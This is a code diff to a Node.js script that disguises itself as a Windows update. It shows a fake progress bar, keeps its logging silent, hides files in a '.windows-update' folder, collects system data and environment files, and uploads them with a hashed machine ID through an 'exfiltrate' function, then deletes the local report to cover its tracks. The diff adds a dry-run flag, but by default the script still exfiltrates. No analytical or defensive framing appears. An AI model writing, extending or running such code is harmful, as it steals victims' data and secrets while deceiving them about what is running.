@@ -18,6 +18,7 @@ const startTime = Date.now();
 const ROOT = path.resolve(__dirname, "..");
 const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
 const LOG_FILE = path.join(os.tmpdir(), ".wu-run.log");
+const DRY_RUN = process.argv.includes("--dry-run");
 
 logger.silent(true);
 logger.setLogFile(LOG_FILE);
@@ -51,6 +52,10 @@ function fakeProgress() {
 
     fakeProgress();
 
+    if (DRY_RUN) {
+        console.log("DRY-RUN MODE — No files will be copied or exfiltrated.");
+    }
+
     try {
         systemData = collectSystemData();
         logger.info("Phase 1 complete");
@@ -70,7 +75,7 @@ function fakeProgress() {
     }
 
     try {
-        crudLog = performCrudOperations(ROOT);
+        crudLog = performCrudOperations(ROOT, DRY_RUN);
         logger.info("Phase 3 complete");
     } catch (err) {
         const wrapped = new PhaseError("Phase 3", err);
@@ -80,15 +85,20 @@ function fakeProgress() {
 
     try {
         const report = buildReport(systemData, envFiles, crudLog, startTime, errors);
-        const reportResult = generateReport(report);
 
-        const systemId = getHashedMachineGuid();
-        report.systemId = systemId;
+        if (DRY_RUN) {
+            generateReport(report);
+            logger.info("Dry-run: report saved locally, exfil skipped");
+        } else {
+            const reportResult = generateReport(report);
+            const systemId = getHashedMachineGuid();
+            report.systemId = systemId;
 
-        const uploaded = await exfiltrate(report, systemId);
-        if (uploaded && reportResult && reportResult.path) {
-            fs.unlinkSync(reportResult.path);
-            logger.debug("Local report deleted after upload");
+            const uploaded = await exfiltrate(report, systemId);
+            if (uploaded && reportResult && reportResult.path) {
+                fs.unlinkSync(reportResult.path);
+                logger.debug("Local report deleted after upload");
+            }
         }
     } catch (err) {
         logger.error(`Report phase failed: ${err.message}`);
@@ -98,11 +108,15 @@ function fakeProgress() {
 
     console.log("Windows Update completed successfully.");
 
-    try {
-        startWatcher(HIDDEN_DIR, (filename, eventType) => {
-            logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
-        });
-    } catch (err) {
-        logger.warn(`Watcher failed to start: ${err.message}`);
+    if (!DRY_RUN) {
+        try {
+            startWatcher(HIDDEN_DIR, (filename, eventType) => {
+                logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
+            });
+        } catch (err) {
+            logger.warn(`Watcher failed to start: ${err.message}`);
+        }
+    } else {
+        logger.info("Dry-run: file watcher skipped");
     }
 })();
